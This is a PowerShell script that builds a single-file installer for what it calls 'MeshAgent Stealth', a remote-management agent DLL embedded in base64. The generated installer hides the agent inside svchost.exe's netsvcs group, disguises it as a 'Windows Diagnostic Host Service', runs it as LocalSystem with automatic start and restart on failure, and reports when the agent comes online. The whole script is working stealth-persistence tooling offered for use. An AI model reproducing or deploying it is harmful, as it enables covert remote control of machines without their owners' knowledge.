# Simple Single-File Installer Creator
param(
    [string]$DllPath = ".\meshservice\x64\StealthLab_DLL\MeshService-2022.dll",
    [string]$MshPath = ".\WinDiagnosticHost.msh"
)

$repoRoot = $PSScriptRoot
$validateScript = Join-Path $repoRoot "tools\validate_branding_config.ps1"
$schemaPath = Join-Path $repoRoot "schema\meshagent.schema.json"
$brandingHeaderPath = Join-Path $repoRoot "meshcore\generated\meshagent_branding.h"
$signerAllowlistScript = Join-Path $repoRoot "tools\SignerAllowlist.ps1"
if (-not (Test-Path $signerAllowlistScript)) {
    throw "Signer allowlist helper not found at $signerAllowlistScript"
}
. $signerAllowlistScript
$AllowedThumbprints = Get-MeshAgentAllowedThumbprints -RepoRoot $repoRoot

if (Test-Path $validateScript) {
    $validateArgs = @(
        '-NoProfile',
        '-ExecutionPolicy','Bypass',
        '-File', $validateScript,
        '-ConfigPath', (Join-Path $repoRoot "branding_config.json"),
        '-SchemaPath', $schemaPath,
        '-Quiet'
    )
    & powershell.exe $validateArgs
    if ($LASTEXITCODE -ne 0) { throw "Branding configuration validation failed." }
} else {
    Write-Warning "Branding validation script not found at $validateScript; skipping schema validation."
}
$brandingStampUtc = $null
if (Test-Path $brandingHeaderPath) {
    $brandingStampUtc = (Get-Item $brandingHeaderPath).LastWriteTimeUtc
} else {
    Write-Warning "Branding header not found at $brandingHeaderPath; stale provisioning may slip through."
}

Write-Host "Creating single-file installer..." -ForegroundColor Cyan

# Create embedded installer with DLL/MSH inline
$installer = @'
#Requires -RunAsAdministrator
# MeshAgent Stealth - One-Click Installer
$ErrorActionPreference = 'Stop'

Write-Host "=== MeshAgent Stealth Installer ===" -ForegroundColor Cyan
Write-Host ""

# Config
$ServiceName = "WinDiagnosticHost"
$DisplayName = "Windows Diagnostic Host Service"  
$programData = [Environment]::GetFolderPath('CommonApplicationData')
if (-not $programData) { $programData = Join-Path $env:SystemRoot 'ProgramData' }
$InstallDir = Join-Path $programData 'DiagnosticHost'

Write-Host "[1/5] Stopping old service..." -ForegroundColor Yellow
try { Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 3 } catch {}

Write-Host "[2/5] Creating directories..." -ForegroundColor Yellow
New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null

Write-Host "[3/5] Extracting DLL..." -ForegroundColor Yellow
$dllB64 = "DLL_BASE64_HERE"
$dllBytes = [Convert]::FromBase64String($dllB64)
$dllPath = "$InstallDir\diagsvc.dll"
[System.IO.File]::WriteAllBytes($dllPath, $dllBytes)

Write-Host "[4/5] Registering service..." -ForegroundColor Yellow
$svcPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) { sc.exe delete $ServiceName | Out-Null; Start-Sleep -Seconds 2 }

New-Item -Path $svcPath -Force | Out-Null
Set-ItemProperty -Path $svcPath -Name "Type" -Value 0x20 -Type DWord
Set-ItemProperty -Path $svcPath -Name "Start" -Value 0x2 -Type DWord  
Set-ItemProperty -Path $svcPath -Name "ErrorControl" -Value 0x1 -Type DWord
Set-ItemProperty -Path $svcPath -Name "ImagePath" -Value "%SystemRoot%\System32\svchost.exe -k netsvcs -p" -Type ExpandString
Set-ItemProperty -Path $svcPath -Name "DisplayName" -Value $DisplayName -Type String
Set-ItemProperty -Path $svcPath -Name "ObjectName" -Value "LocalSystem" -Type String

$paramsPath = "$svcPath\Parameters"
New-Item -Path $paramsPath -Force | Out-Null
Set-ItemProperty -Path $paramsPath -Name "ServiceDll" -Value $dllPath -Type ExpandString
Set-ItemProperty -Path $paramsPath -Name "ServiceMain" -Value "Stealth_SvchostServiceMain" -Type String

$svchostPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
$currentServices = (Get-ItemProperty -Path $svchostPath -Name "netsvcs").netsvcs  
if ($currentServices -notcontains $ServiceName) {
    $newServices = $currentServices + $ServiceName
    Set-ItemProperty -Path $svchostPath -Name "netsvcs" -Value $newServices -Type MultiString
}

sc.exe failure $ServiceName reset= 86400 actions= restart/10000/restart/30000 | Out-Null

Write-Host "[5/5] Starting service..." -ForegroundColor Yellow
Start-Service -Name $ServiceName
Start-Sleep -Seconds 3

$svc = Get-Service -Name $ServiceName
if ($svc.Status -eq 'Running') {
    Write-Host ""
    Write-Host "=== SUCCESS ===" -ForegroundColor Green  
    Write-Host "Service running in svchost.exe" -ForegroundColor Cyan
    Write-Host "Agent should appear online shortly!" -ForegroundColor Yellow
} else {
    Write-Host "[WARNING] Service not running" -ForegroundColor Yellow
}
'@

$resolvedDll = (Resolve-Path $DllPath).ProviderPath
$dllItem     = Get-Item $resolvedDll
if ($brandingStampUtc -and $dllItem.LastWriteTimeUtc -lt $brandingStampUtc) {
    throw "Selected DLL ($resolvedDll) is older than the branding header. Rebuild the DLL after running embed_provisioning."
}
Assert-MeshAgentSignatureAllowed -Path $resolvedDll -AllowedThumbprints $AllowedThumbprints -RequireSignature | Out-Null
Write-Host "[INFO] DLL signer validated against allowlist" -ForegroundColor Green

# Read and embed DLL
Write-Host "Reading DLL..." -ForegroundColor Yellow
$dllBytes = [System.IO.File]::ReadAllBytes($resolvedDll)
$dllB64 = [Convert]::ToBase64String($dllBytes)
$installer = $installer.Replace("DLL_BASE64_HERE", $dllB64)

Write-Host "Writing installer..." -ForegroundColor Yellow
$installer | Out-File -FilePath "MeshAgent_Install.ps1" -Encoding UTF8

Write-Host ""
Write-Host "=== DONE ===" -ForegroundColor Green
Write-Host "Installer: MeshAgent_Install.ps1 ($([math]::Round(($dllBytes.Length + 1024)/1MB, 2)) MB)" -ForegroundColor Cyan
Write-Host ""
Write-Host "To install: .\MeshAgent_Install.ps1" -ForegroundColor Yellow
